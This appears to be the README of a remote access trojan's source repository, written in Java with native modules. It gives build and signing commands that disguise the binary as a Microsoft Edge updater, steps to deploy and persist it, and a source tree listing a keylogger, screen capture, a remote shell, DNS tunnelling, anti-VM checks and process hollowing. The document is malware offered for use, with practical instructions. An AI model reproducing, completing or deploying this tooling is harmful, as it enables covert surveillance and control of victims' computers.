# com.sun.rt - JVM-resident RAT (source)

## Build
    export JAVA_HOME=/path/to/jdk8
    bash build.sh
    launch4j launch4j.xml
    signtool sign /fd sha256 /a /tr http://timestamp.digicert.com /td sha256 build/msedgeupd.exe

Native needs mingw-w64, xxd, python3.

## Deploy
1. Edit hosts/zone/PSK in core/Config.java.
2. Place msedgeupd.exe + msedgeupd.jar under %LOCALAPPDATA%\Microsoft\EdgeUpdate\.
3. First run sleeps 90 s, then persists and beacons. Later runs pass -boot.

## Known gaps
- hollowSelf() needs payload.inc from a built stub.exe; stub assumes a JRE at
  %ProgramFiles%\Java\jre - adjust for bundled runtimes.
- NtUnmapViewOfSection is used undeclared; include <winternl.h> and drop the
  typedef if your SDK complains.

  src/main/java/com/sun/rt/
├── Bootstrap.java              # entry, gate, wiring
├── core/Native.java            # JNI bridge
├── core/Dispatcher.java        # task queue
├── core/Transport.java         # AES-GCM + HTTPS + pinning
├── core/Heartbeat.java         # beacon loop, backoff, DNS failover
├── core/DnsTunnel.java         # base32 TXT fallback
├── core/Gate.java              # anti-VM / anti-debug
├── core/Config.java            # decrypted runtime config
├── core/Persist.java           # 3 mechanisms
├── mod/Keylogger.java          # buffer + chunker
├── mod/Chunk.java              # TLV framing
├── mod/Screen.java             # AWT Robot
├── mod/Files.java              # browse / get / put
├── mod/Shell.java              # cmd.exe bridge
├── util/S.java                 # string decryption
└── util/Log.java               # no-op in release
src/main/native/
├── com_sun_rt_core_Native.h    # generated
├── keyhook.cpp
├── hollow.cpp
├── unhook.cpp
├── sysinfo.cpp
└── jvmstub.cpp                 # hollow payload
